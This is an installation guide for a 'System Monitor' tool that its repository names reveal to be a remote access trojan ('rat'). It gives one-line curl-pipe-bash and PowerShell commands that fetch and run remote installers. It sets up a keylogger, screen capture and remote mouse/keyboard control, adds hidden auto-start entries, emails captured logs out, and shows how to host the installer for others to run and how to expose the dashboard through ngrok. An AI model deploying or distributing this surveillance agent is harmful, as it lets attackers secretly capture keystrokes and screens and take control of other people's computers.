# System Monitor - Installation Guide

## Quick Install (One Command)

### Linux/macOS
```bash
curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
```

Or with wget:
```bash
wget -qO- https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
```

### Windows
```powershell
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/YOUR_USER/rat/main/install_windows -OutFile install.bat" && install.bat
```

Or in Command Prompt:
```cmd
curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install_windows -o install.bat && install.bat
```

That's it! The installer will:
1. ✅ Download the agent
2. ✅ Install Python dependencies
3. ✅ Configure auto-start
4. ✅ Start all services
5. ✅ Open dashboard at http://localhost:5000

## Manual Install (Download Folder)

### Option 1: Clone from GitHub
```bash
git clone https://github.com/YOUR_USER/rat.git
cd rat
./install.sh  # Linux/macOS
# or
install_windows.bat  # Windows
```

### Option 2: Download ZIP
1. Download: https://github.com/YOUR_USER/rat/archive/main.zip
2. Extract: `unzip main.zip`
3. Run installer:
   - Linux: `cd rat-main && ./install.sh`
   - Windows: `cd rat-main && install_windows.bat`

## What Gets Installed

### Files Downloaded
```
~/.sysmon/agent/          # Linux/macOS
or
C:\Users\YOUR_USER\sysmon\agent\  # Windows

Contains:
├── rat_agent/            # Main agent code
├── dashboard/            # Web dashboard
├── requirements.txt      # Python dependencies
└── config.py            # Configuration
```

### Python Packages Installed
- flask, flask-socketio (web dashboard)
- mss, pillow (screen capture)
- pyautogui (mouse/keyboard - Windows)
- evdev (keylogger - Linux)
- requests (HTTP/email)

### System Tools (Linux only)
- xdotool (mouse control)
- imagemagick (screen fallback)

## Auto-Start Configuration

### Linux
Added to crontab:
```bash
@reboot cd ~/.sysmon/agent && nohup python3 rat_agent/agent.py & ...
```

### Windows
Created startup shortcut:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System Monitor.bat
```

### macOS
Manual setup required (see CROSS_PLATFORM.md)

## Accessing the Dashboard

### Local Access
```
URL: http://localhost:5000
Login: admin / rat_admin_2024
```

### Remote Access (Same Network)
1. Find your IP:
   - Linux: `hostname -I | cut -d' ' -f1`
   - Windows: `ipconfig` (look for IPv4)
2. Access from other device: `http://YOUR_IP:5000`

### Remote Access (Internet)
Use ngrok:
```bash
ngrok http 5000
```
Share the https:// URL provided.

## Configuration

Edit `~/.sysmon/agent/rat_agent/config.py`:

```python
class Config:
    # Email settings
    SENDER_EMAIL = "your_email@gmail.com"
    DEFAULT_RECIPIENTS = ["recipient@example.com"]
    
    # Dashboard
    DASHBOARD_USERNAME = "admin"
    DASHBOARD_PASSWORD = "rat_admin_2024"  # Change this!
    
    # Log capture interval (seconds)
    LOG_CAPTURE_INTERVAL = 300  # 5 minutes
    
    # Remote screen
    SCREEN_ENABLED = True
    
    # Keylogger
    KEYLOGGER_ENABLED = True
```

## Managing the Agent

### Check Status
```bash
# Linux/macOS
ps aux | grep sysmon

# Windows
tasklist | findstr python
```

### View Logs
```bash
# Linux/macOS
tail -f /tmp/sysmon_agent.log
tail -f /tmp/sysmon_dashboard.log

# Windows
type %TEMP%\sysmon_agent.log
```

### Stop Agent
```bash
# Linux/macOS
pkill -f 'rat_agent/agent.py'
pkill -f 'dashboard/app.py'

# Windows
taskkill /F /IM python.exe
```

### Start Agent
```bash
# Linux/macOS
cd ~/.sysmon/agent
nohup python3 rat_agent/agent.py &
nohup python3 dashboard/app.py &

# Windows
cd C:\Users\YOUR_USER\sysmon\agent
start /B python rat_agent\agent.py
start /B python dashboard\app.py
```

### Reinstall
```bash
# Just run the installer again!
curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
```

## Hosting Your Own

### Option 1: GitHub (Recommended)
1. Upload code to GitHub
2. Update URLs in `install` and `install_windows`:
   ```bash
   GITHUB_USER=your_username
   GITHUB_REPO=your_repo
   ```
3. Users install with:
   ```bash
   curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
   ```

### Option 2: Your Web Server
1. Upload `agent.tar.gz` and `agent_windows.zip` to your server
2. Update URLs in installers:
   ```bash
   AGENT_URL="https://your-server.com/agent.tar.gz"
   ```
3. Users install from your server

### Option 3: Direct Download
1. Share the `rat` folder directly
2. Users extract and run `./install.sh`

## Troubleshooting

### Python Not Found
```bash
# Install Python
sudo apt install python3 python3-pip  # Ubuntu/Debian
sudo dnf install python3 python3-pip  # RHEL/Fedora
brew install python3                   # macOS
# Windows: Download from python.org
```

### Download Fails
Check URL is accessible:
```bash
curl -I https://raw.githubusercontent.com/YOUR_USER/rat/main/install
```

### Port 5000 in Use
Change port in `config.py`:
```python
DASHBOARD_PORT = 5001
```

### Mouse Control Not Working (Linux)
```bash
sudo apt install xdotool
```

### Screen is Black
- Ensure display server is running
- On headless: `startx` or use Xvfb
- Windows: Not Remote Desktop session

## Uninstall

### Linux/macOS
```bash
# Stop processes
pkill -f 'rat_agent/agent.py'
pkill -f 'dashboard/app.py'

# Remove files
rm -rf ~/.sysmon

# Remove cron
(crontab -l | grep -v sysmon) | crontab -
```

### Windows
```cmd
rem Stop processes
taskkill /F /IM python.exe

rem Remove files
rmdir /s %USERPROFILE%\sysmon

rem Remove startup
del %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System Monitor.bat
```

## Summary

| Method | Command | Best For |
|--------|---------|----------|
| **Bootstrap** | `curl ... \| bash` | Quick install |
| **Git Clone** | `git clone ...` | Development |
| **ZIP Download** | Download & extract | No git needed |
| **Local Folder** | Copy & run | Offline use |

**Easiest:** Just run the bootstrap installer! 🚀

```bash
curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
```
